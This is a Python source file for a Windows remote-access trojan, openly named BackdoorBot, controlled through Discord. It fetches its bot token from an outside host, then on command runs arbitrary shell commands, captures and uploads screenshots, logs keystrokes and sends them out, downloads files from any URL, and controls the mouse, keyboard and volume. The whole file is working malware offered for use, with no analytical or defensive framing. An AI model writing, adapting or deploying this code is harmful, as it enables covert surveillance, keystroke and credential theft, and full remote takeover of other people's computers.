import ctypes.wintypes
import discord
import pyautogui, keyboard
import io
import subprocess, threading
import winsound, pygame.mixer
import os
import requests
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
from comtypes import CLSCTX_ALL


def get_documents_folder():
    CSIDL_PERSONAL = 5
    SHGFP_TYPE_CURRENT = 0

    buf = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
    ctypes.windll.shell32.SHGetFolderPathW(None, CSIDL_PERSONAL, None, SHGFP_TYPE_CURRENT, buf)
    return buf.value

temp_dir = os.path.join(get_documents_folder())

recording = False
recorded_keys = []
recording_thread = None
app_version = "1.1.0"

def download_file(url, filename):
    temp_dir = os.path.join(get_documents_folder())
    if not os.path.exists(os.path.join(temp_dir, "etc")):
        os.makedirs(os.path.join(temp_dir, "etc"))
    temp_dir = os.path.join(temp_dir, "etc")
    response = requests.get(url)
    if response.status_code == 200:
        with open(os.path.join(temp_dir, filename), 'wb') as file:
            file.write(response.content)
    else:
        raise Exception("Error al descargar el archivo desde la URL proporcionada")

def fetch_token():
    response = requests.get("https://api.npoint.io/db9d3767c9e0cb7889a4")
    if response.status_code == 200:
        data = response.json()
        return data.get("token", "")
    else:
        raise Exception("Error al obtener el token de la API")

def download_audio(url, filename):
    os.mkdir(os.path.join(temp_dir, "daSigmaFolder"))
    
    response = requests.get(url)
    with open(os.path.join(temp_dir + "daSigmaFolder", filename), 'wb') as file:
        try:
            file.write(response.content)
        except Exception as e:
            return (f"Error al descargar el audio: {e}")

def play_audio(filename):
    try:
        pygame.mixer.init()
        pygame.mixer.music.load(os.path.join(temp_dir, "daSigmaFolder", filename))
        pygame.mixer.music.play()

        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)
        pygame.mixer.quit()
    except Exception as e:
        return (f"Error al reproducir el audio: {e}")

def record_keys():
    global recording, recorded_keys
    while recording:
        event = keyboard.read_event()
        if event.event_type == keyboard.KEY_DOWN:
            recorded_keys.append(event.name)

intents = discord.Intents.default()
intents.message_content = True

class BackdoorBot(discord.Client):
    def __init__(self, token):
        super().__init__(intents=intents)
        self.token = token
    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.content.startswith('!screenshot'):
            ss = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            ss.save(img_bytes, format='PNG')
            img_bytes.seek(0)
            await message.channel.send(file=discord.File(img_bytes, filename='screenshot.png'))

        elif message.content.startswith('!shutdown'):
            await message.channel.send("Shutting down...")
            await self.close()

        elif message.content.startswith('!getkeys'):
            keys = ', '.join(pyautogui.KEYBOARD_KEYS)
            await message.channel.send(f"Teclas disponibles:\n{keys[:1900]}...")
        elif message.content.startswith("!presskey"):
            key = message.content.split(" ", 1)[1]
            await message.channel.send(f"Presionando la tecla: {key}")
            if key in pyautogui.KEYBOARD_KEYS:
                pyautogui.press(key)
                await message.channel.send(f"Tecla '{key}' presionada.")
            else:
                await message.channel.send(f"Tecla '{key}' no reconocida.")
        elif message.content.startswith('!type'):
            text = message.content.split(" ", 1)[1]
            await message.channel.send(f"Escribiendo: {text}")
            pyautogui.typewrite(text)
            await message.channel.send("Texto escrito.")
        elif message.content.startswith("!run"):
            parts = message.content.split(" ", 1)
            if len(parts) < 2 or not parts[1].strip():
                await message.channel.send("Por favor, proporciona un comando para ejecutar.")
                return
            command = parts[1]

            await message.channel.send(f"Ejecutando comando: {command}")
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                await message.channel.send(f"Salida del comando:\n{output[:1900]}...")
            except subprocess.CalledProcessError as e:
                await message.channel.send(f"Error al ejecutar el comando:\n{e.output[:1900]}...")
        elif message.content.startswith("!getmousepos"):
            x, y = pyautogui.position()
            await message.channel.send(f"Posición del mouse: X={x}, Y={y}")
        elif message.content.startswith("!movemouse"):
            try:
                parts = message.content.split(" ")
                if len(parts) != 3:
                    await message.channel.send("Uso: !movemouse <x> <y>")
                    return
                x, y = int(parts[1]), int(parts[2])
                pyautogui.moveTo(x, y)
                await message.channel.send(f"Mouse movido a la posición: X={x}, Y={y}")
            except ValueError:
                await message.channel.send("Por favor, proporciona coordenadas válidas.")
        elif message.content.startswith("!recordkeys"):
            global recording, recorded_keys, recording_thread
            if recording:
                await message.channel.send("Ya se esta grabando")
                return
            recorded_keys = []
            recording = True
            recording_thread = threading.Thread(target=record_keys, daemon=True)
            recording_thread.start()
            await message.channel.send("Grabando... (!stop)") 
        elif message.content.startswith("!stop"):
            if not recording:
                await message.channel.send("No se esta grabando")
                return
            recording = False
            recording_thread.join()

            if recorded_keys:
                key_log = recorded_keys
            else:
                key_log = "No se grabaron teclas."
            
            if len(key_log) > 1900:
                chunks = [key_log[i:i + 1900] for i in range(0, len(key_log), 1900)]
                for chunk in chunks:
                    await message.channel.send(chunk)
            else:
                await message.channel.send(key_log)

            while True:
                event = keyboard.read_event()
                if event.event_type == keyboard.KEY_DOWN:
                    recorded_keys.append(event.name)
        elif message.content.startswith("!beep"):
            winsound.Beep(1000, 250)
        elif message.content.startswith("!help"):
            help_text = (
                "!screenshot - Toma una captura de pantalla.\n"
                "!shutdown - Apaga el bot.\n"
                "!getkeys - Muestra las teclas disponibles.\n"
                "!presskey <tecla> - Presiona una tecla específica.\n"
                "!type <texto> - Escribe un texto.\n"
                "!run <comando> - Ejecuta un comando del sistema.\n"
                "!getmousepos - Obtiene la posición actual del mouse.\n"
                "!movemouse <x> <y> - Mueve el mouse a una posición específica.\n"
                "!recordkeys - Comienza a grabar las teclas presionadas.\n"
                "!stop - Detiene la grabación de teclas y muestra el registro.\n"
                "!beep - Emite un sonido beep.\n"
            )
            await message.channel.send(help_text)
        elif message.content.startswith("!playsound"):
            url = message.content.split(" ", 1)[1]
            global fileExtension
            fileExtension = url.split('.')[-1]
            filename = os.path.join(temp_dir, "daSigmaFolder", "ANASHEIGODANASHEIAUDIOANASHEI." + fileExtension)
            await message.channel.send(f"Descargando audio desde: {url}")
            download_audio(url, filename)
            await message.channel.send("Reproduciendo sonido...")
            play_audio("ANASHEIGODANASHEIAUDIOANASHEI." + fileExtension)
            await message.channel.send("Sonido reproducido.")
            import time
            time.sleep(1)
            folder_path = os.path.join(temp_dir, "daSigmaFolder")
            subprocess.run(f'rmdir /s /q "{folder_path}"', shell=True)
        elif message.content.startswith('!setvolumen'):
            try:
                volume = int(message.content.split(" ")[1])
                if 0 <= volume <= 100:
                    devices = AudioUtilities.GetSpeakers()
                    interface = devices.Activate(
                        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
                    volume_control = cast(interface, POINTER(IAudioEndpointVolume))
                    volume_control.SetMute(0, None)
                    volume_control.SetMasterVolumeLevelScalar(volume / 100.0, None)
            
                    await message.channel.send(f"Volumen establecido a {volume}%.")
                else:
                    await message.channel.send("El volumen debe estar entre 0 y 100.")
            except ValueError:
                await message.channel.send("Por favor, proporciona un número válido para el volumen.")
        elif message.content.startswith('!getversion'):
            await message.channel.send(f"Versión de la aplicación: {app_version}")
        elif message.content.startswith("!leftclick"):
            pyautogui.click(button='left')
            await message.channel.send("Clic izquierdo realizado.")
        elif message.content.startswith("!rightclick"):
            pyautogui.click(button='right')
            await message.channel.send("Clic derecho realizado.")
        elif message.content.startswith("!downloadfile"):
            link = str(message.content.split(" ")[1])
            filename = link.split("/")[-1]
            await message.channel.send(f"Descargando archivo desde: {link}")
            try:
                download_file(link, filename)
                await message.channel.send(f"Archivo descargado: {filename}")
            except Exception as e:
                await message.channel.send(f"Error al descargar el archivo: {e}")
        elif message.content.startswith("!deletefolder"):
            if os.path.exists(os.path.join(temp_dir, "etc")):
                folder_path = os.path.join(temp_dir, "etc")
                subprocess.run(f'rmdir /s /q "{folder_path}"', shell=True)
                await message.channel.send("Carpeta eliminada.")
            


    def run_bot(self):
        self.run(self.token)
token = fetch_token()
bot = BackdoorBot(token)
bot.run_bot()